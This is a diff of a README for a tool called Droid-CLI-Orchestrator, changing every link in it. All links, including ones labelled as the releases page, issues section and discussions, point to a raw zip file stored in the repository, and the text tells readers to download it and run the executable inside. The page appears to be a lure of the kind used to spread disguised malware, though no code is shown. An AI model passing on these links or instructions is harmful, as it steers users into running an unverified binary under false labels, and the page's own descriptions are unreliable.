@@ -1,6 +1,6 @@
 # 🤖 Droid-CLI-Orchestrator - Streamline Your Development Tasks
 
-[![Download Droid-CLI-Orchestrator](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip)](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip)
+[![Download Droid-CLI-Orchestrator](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip)](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the Droid CLI Orchestrator! This application helps you coordinate spe
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip).
+   Go to the [Releases page](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip).
 
 2. **Find the Latest Version**  
    On the Releases page, look for the latest version of Droid-CLI-Orchestrator. This will typically be at the top of the list.
@@ -17,9 +17,9 @@ Welcome to the Droid CLI Orchestrator! This application helps you coordinate spe
 3. **Choose the Right File**  
    Depending on your operating system, select the appropriate file for download. Common options include Windows, macOS, and Linux versions. 
 
-    - **For Windows:** You might see a file like `https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip`.
-    - **For macOS:** Look for a file like `https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip`.
-    - **For Linux:** You may find a file like `https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip`.
+    - **For Windows:** You might see a file like `https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip`.
+    - **For macOS:** Look for a file like `https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip`.
+    - **For Linux:** You may find a file like `https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip`.
 
 4. **Download the File**  
    Click on the chosen file to begin the download.
@@ -29,7 +29,7 @@ Welcome to the Droid CLI Orchestrator! This application helps you coordinate spe
 
    - **For Windows:** Double-click the `.exe` file to install and run the application.
    - **For macOS:** Unzip the `.zip` file and double-click the application to start it.
-   - **For Linux:** Extract the `https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip` file, navigate to the folder in your terminal, and enter `./Droid-CLI-Orchestrator` to run it.
+   - **For Linux:** Extract the `https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip` file, navigate to the folder in your terminal, and enter `./Droid-CLI-Orchestrator` to run it.
 
 ## 🖥️ System Requirements
 
@@ -58,11 +58,11 @@ If you encounter issues during installation or while running the application, co
 2. **Re-download the Installer:** If the file is corrupted, try downloading it again from the Releases page.
 3. **Permissions:** Make sure you have the necessary permissions to install and run applications on your system.
 
-If problems persist, visit the [issues section](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip) of our GitHub repository for help.
+If problems persist, visit the [issues section](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip) of our GitHub repository for help.
 
 ## 🌐 Community Support
 
-Join our community of users to share your experience or seek help. You can find discussions, tips, and support in our [GitHub Discussions](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip).
+Join our community of users to share your experience or seek help. You can find discussions, tips, and support in our [GitHub Discussions](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip).
 
 ## 📝 Contribution Guidelines
 
@@ -76,8 +76,8 @@ Your contributions help make this tool better for all users.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip)
-- [Issues Section](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/toya1111/Droid-CLI-Orchestrator/main/headlongwise/Droid-CLI-Orchestrator.zip)
+- [Releases Page](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip)
+- [Issues Section](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip)
+- [GitHub Discussions](https://github.com/toya1111/Droid-CLI-Orchestrator/raw/refs/heads/main/droids/Orchestrator_Droid_CL_aucuba.zip)
 
 Visit the Releases page now to download and start using Droid-CLI-Orchestrator today!
